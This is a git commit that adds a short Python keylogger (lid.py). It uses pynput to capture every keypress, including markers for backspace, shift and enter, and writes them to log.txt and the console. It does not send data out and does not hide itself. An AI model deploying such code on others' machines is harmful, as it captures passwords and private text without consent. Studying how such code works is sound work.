0c61f659b31100199d762930b9f4681b18d47e98
Dave-Projects <nicka18chinese@gmail.com>
2025-09-27 08:38:39 +0800

    initial commit

---
+++ lid.py
@@ -0,0 +1,37 @@
+import pynput.keyboard
+from pynput.keyboard import Key
+
+class SimpleClassLogger:
+    def __init__(self):
+        self.logger = ""
+
+    def append_to_log(self, key_strike):
+        self.logger = self.logger + key_strike
+        with open("log.txt", "a", encoding="utf-8") as new_file:
+            new_file.write(self.logger)
+        print(self.logger, end="", flush=True)
+        self.logger = ""
+
+    def evaluate_keys(self, key):
+        try:
+            pressed_key = str(key.char)
+            # log letters, numbers, punctuation
+            if pressed_key.isprintable():
+                self.append_to_log(pressed_key)
+        except AttributeError:
+            if key == Key.backspace:
+                self.append_to_log("[BACKSPACE]")
+            elif key in (Key.shift, Key.shift_r):
+                self.append_to_log("[SHIFT]")
+            elif key == Key.enter:
+                self.append_to_log("\n")  
+            else:             
+                pass
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
+        with keyboard_listener:
+            self.logger = ""
+            keyboard_listener.join()
+
+SimpleClassLogger().start()
